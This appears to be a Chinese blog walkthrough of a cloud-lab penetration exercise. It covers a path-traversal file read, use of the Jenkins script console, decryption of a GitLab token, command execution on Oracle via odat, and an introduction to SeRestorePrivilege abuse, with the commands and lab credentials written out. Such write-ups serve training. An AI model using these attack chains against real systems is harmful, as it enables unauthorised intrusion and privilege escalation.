---
title: 春秋云境 Privilege
url: https://mp.weixin.qq.com/s/YtJCp9PWlK33DKTBOV2YiQ
source: Doonsec's feed
date: 2026-04-23
fetch_date: 2026-04-24T04:51:57.349880
---

# 春秋云境 Privilege

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/A79OztZnWVkRASAYDxgr4lRbhZH9YQYKYIlxCDyC0VQ32Kp3fPlQwAXcWysicpf862dRKiaoHQibicRksC2ficrnbiaWjJoXkK0XyRkj02BpiaJBvI/0?wx_fmt=jpeg)

# 春秋云境 Privilege

原创

my
my

云晞科技Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# Privilege

春秋云镜:https://yunjing.ichunqiu.com/

**靶机地址:39.99.236.81**

# 第一关

* 请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:ProgramDataJenkins.jenkins

fscan扫了一波,发现有：

> ❝
>
> FTP:21
> http:80,8080
> mysql:3306

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVl1XNqqdMAQgGrkH0L5GT76jynopgCNnXEaJ5INVaUZb5GX7d8sCiaJwdKsv0ZpJJMUTS7S5mDlS1WwasCcXJYra6KYcpmd4eXQ/640?wx_fmt=png&from=appmsg)

优先访问下80
是用wordperss搭建的博客

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/A79OztZnWVkOMwxe58Nlic7qvWyTafopQWOGDm9aJictujicJIyEoQFaY9FksJ7DrPA0iagoM0skf61DnskgeTnb94BFia5fV5VL4h44ibmNqbxqo/640?wx_fmt=jpeg&from=appmsg)

wpscan没注册,大部分漏洞扫不出来,这里先访问8080->Jenkins

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVlonooCZ0JMJ1T9El1Um3dStNvnhpjcRy968TYA50ficAoBsnMibs3obL7ShwQ7dBdjGkM4MjkzhVC5gnbvjCUOSiaaT8RfxklY08/640?wx_fmt=png&from=appmsg)

弱口令尝试失败,扫下目录
扫到一个www.zip,像是一个备份文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVk4OgO8gY16ASeG11Ohkm0CG6PEZWNVeZCdlmYwEbCfLP5s99McmcsicEIycqGPFsAT9JlEv6towIaJmK1Jk7KxDicXZ8tibtfo7I/640?wx_fmt=png&from=appmsg)

wp-config.php 找到数据库账户密码，虽然3306 端口开放了，但发现存在限制连接不上

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVlX5RIhlbrRoeDMdGibZQTiaDrR4cicDAaibMv6LbiaWv0nAqbpK7KJvPmfIpicqLRthAR1dsLtFNU10ukfU1R6yzz2kwwDkgwPjW8C8/640?wx_fmt=png&from=appmsg)

toolsphpinfo.php phpinfo

toolscontent-log.php CVE-2022-4140 对应前面扫出来的 poc-yaml-backup-file

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVnakc1AdLJgOp5FTd2DYUDWVn4kOfBzIXJ2JUs4ulR8PkUxUlbZWeAAap8q6icEe9UWBiaPicCicskuMt6G0ibgx6HKzYGZoWfjKg3g/640?wx_fmt=png&from=appmsg)

直接把 GET 参数 logfile 解码后拼接到文件路径,无任何过滤 / 校验

根据提示Jenkins 配置目录为 C:ProgramDataJenkins.jenkins 和网上搜到的
最终确定密码存放目录在C:ProgramDataJenkins.jenkinssecretsinitialAdminPassword

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVnFRTzAyOup90tEdY68NKE3ILNjGMxibCH5EnbSSrP8D66JysEjZc1MX6zXGZkU5JBOI1a9MDddnU6ibX1QqeCdnNmcUHCjItaNA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVmibW5FicGG8zficicRYEVHnx4cpQv3lhrevIW4oTI8UfcZ7YXtEyBwpTNJ878rakxPrO3ibUNiaWmpKla7QRS20Xt9gq1icpvOfjicu6Y/640?wx_fmt=png&from=appmsg)

拿到密码:510235cf43f14e83b88a9f144199655b

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVmzGlft4DGmsiapTQ47XYvOp2RXCqOEXJlGRe9xHgAH3GtgJR3JJzaPRjo6aiczpicQSKCjqFzric8B3JIP3EJRo0Zwl2uVJRv6exo/640?wx_fmt=png&from=appmsg)

找到一个命令执行的地方

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVlpbIG9ics5t04iaPfrmiaMSMkTEwdnSvh1lIOlJnoCxXnUTAlyL99NnC751PViaSO7fJGJ78WaP1bbQy9gUsG42zXb1iaBOibbmSWN8/640?wx_fmt=png&from=appmsg)

```
#查看当前用户权限将命令执行结果打印出来(返回的是 nt authoritysystem 权限比较高)
println "whoami".execute().text
#直接创建用户然后RDP登录进去
println "net user ycha Key-1122 /add".execute().text
println "net localgroup administrators ycha /add".execute().text
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVk5OeUgasIFQxOQgiadtb4vwRzzx91fqON5B2MzVQf8pr0U6b34X1ibp57Zs7CGy8oXKBZCoWr29ZVicicQvqEsELrSCacymicnCPEs/640?wx_fmt=png&from=appmsg)

## flag1

```
flag{c5eceaad-d041-44c0-a5bc-253ea5ae9f21}
```

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVnSUyaud28z1S1ia2tXtoicWrHhBVHA3xAkSHXs1lHP2iaMecAzoT8b86M2fVxDibK044oaeBsIPLkT8Rusf1brYoxQ2795CRwxVZ8/640?wx_fmt=png&from=appmsg)

上传fscan 扫描内网

```
172.22.14.7 XR-JENKINS
172.22.14.16 /users/sign_in，标题Sign in · GitLab
172.22.14.11 域控 DC:XIAORANGXR-DC
172.22.14.31 XR-ORACLE
172.22.14.46 XR-0923
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVkFJUpIyT6cUKVfVoNS5pibjdialZSiaEicSbL2TrxyfEicTGRmiaNz5ALUk5p0f3IBDXXhYTPAMPsdykxyShOMpibCwlvF5TIKzJKlII/640?wx_fmt=png&from=appmsg)

# 第二关

管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限

在C:/ProgramData/Jenkins/.jenkins/credentials.xml下翻到

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVmCrreqtPdbnQlgjya3banMguPVyJbpQ5wSTODJleZB2ibtQpjSODImtHsgPLnjjeRibOgJhLjOdlJEb4WhnFiceFD26u6HIApicSE/640?wx_fmt=png&from=appmsg)

```
{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}
```

回到脚本命令执行里解密:

```
println(hudson.util.Secret.fromString("{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}").getPlainText())
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVnRVe5AyVS2DE8VcKUQr0YfhKpEXicFNBKX777IyI22IhzfFfRibFIWTBh6vs6VW1Tpn4uvUgMKjicOJ6WT9cvVQVZWMt5OHPxFJE/640?wx_fmt=png&from=appmsg)

得到token明文

glpat-7kD\_qLH2PiQv\_ywB9hz2

搭建一下内网代理

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVneia4yobmNEnwcKOgNAUWxhiaujd6yLQcEP07lcjmjXaUTxZibLytg9HPyhyREPZ9XJRxJUXFJjcoATy4zpNPmqNDMAxMHMQOUnQ/640?wx_fmt=png&from=appmsg)

**探测Git仓库**：

* 使用API访问GitLab项目：
* proxychains4 curl --silent --header "PRIVATE-TOKEN: glpat-7kD\_qLH2PiQv\_ywB9hz2" "http://172.22.14.16/api/v4/projects/" | jq | grep "http\_url\_to\_repo"

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVlOlg5QzUfv5C4MnS39VHrIY8AOvXB2aCOCiaXrlwlD4Iib4Fd5WHJU0JXaowFQnPRLJiavo6cxqpq4NicGZQB13s5tMWpEBkgibRM8/640?wx_fmt=png&from=appmsg)
将git文件都克隆下来

```
proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git proxychains git clone http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/gitlab-instance-23352f48/Monitoring.git
```

发现一堆账户密码,应该能用的上
![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVlSRoInfeQPXl6iawzc2R2xGJrES5WYskdKkYSTFpictllg6iaIPKhiawq7pbeRm2MGP1yAkeRtFOEppT64GqAKibj7RhCQydmqNPkQ/640?wx_fmt=png&from=appmsg)

在xradmin/ruoyi-admin/src/main/resources/application-druid.yml 下找到数据库账户密码

* 用户：xradmin
* 密码：fcMyE8t9E4XdsKf

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVk4nq6icy72yHje7ZeP1byvApsjcYox1sn4PLEtbJoyoTeY22sLibtrsIF4lSOiaibq3vJTNoRq7A4NDiaYDoPuPq72FSj4u5b7ZrtA/640?wx_fmt=png&from=appmsg)

添加系统用户：

```
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net user ycha Key-1122 /add'
proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec 'net localgroup Administrators ycha /add'
```

windows 本地搭建代理连接内网

下载proxifier
![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVn71Zx6OicjPqiaQ17SvExF1ZyzHZAIPYuHfg0yLwJv3DoFYL1iabsZpibkZWibd4kHvdQLDAeVGQ2Tn4ZJgntdAicbERNFicNg7EVS6I/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVmqXJ4joicMCqYbeT6LB2xGQ8ADiaN7GsuMRoDsX1eSMDqyCAeZcy0YVKvliaA2LPWzLHg0gezrz22O9nD1julAsD2L5wTLicEWeEk/640?wx_fmt=png&from=appmsg)

远程rdp进去

## flag2

```
flag{70021628-5188-42e8-a1e6-70a59cb2076b}
```

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZnWVnFehX4gB8tMOeaqssYGW1Vw2Yc4uJ3AHSiblLiaypCCFxKZNvznEmTkHJwX3FUyibd0OMqX8jj9EJvV70fuCZ3HmZmEL2eaRAmEI/640?wx_fmt=png&from=appmsg)

# 第三关

攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。

在前面找到的用户中以下刚好是对应fscan扫出来的 172.22.14.46 XR-0923,可以直接登录

```
XR-0923 | zhangshuai | wSbEajHzZs
```

登进发现权限较低,但它是Remote Management Use成员,参考https://forum.butian.net/share/2080

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVlAQaCYSNyJo3zI4lxTjhTs1Eo67mwYYlxyZTvNAZTvQAz3Nqia6kzAR2hzv9A2icuoLY7icuzJ8ssxib7iape6dx55h1DFgeJn2hPc/640?wx_fmt=png&from=appmsg)

回到kali用 proxychains evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs 来连接发现多了SeRestorePrivilege

![](https://mmbiz.qpic.cn/sz_mmbiz_png/A79OztZnWVn2mHvan9QJbcNv9vtTjLiabDBGPhgMbTT4d7CjYTRtIacr4DTJcaqR6R6UB0DCl384Cqkzvu8EnBLUORNGU3mRSnNgZxJ3kmsA/640?wx_fmt=png&from=appmsg)

### SeRestorePrivilege提权

可以通过三种方式达到滥用特权的目的

1、修改服务二进制文件
2、覆盖系统进程使用的DLL
3、修改注册表设置

![](https://mmbiz.qpic.cn/mmbiz_png/A79OztZn...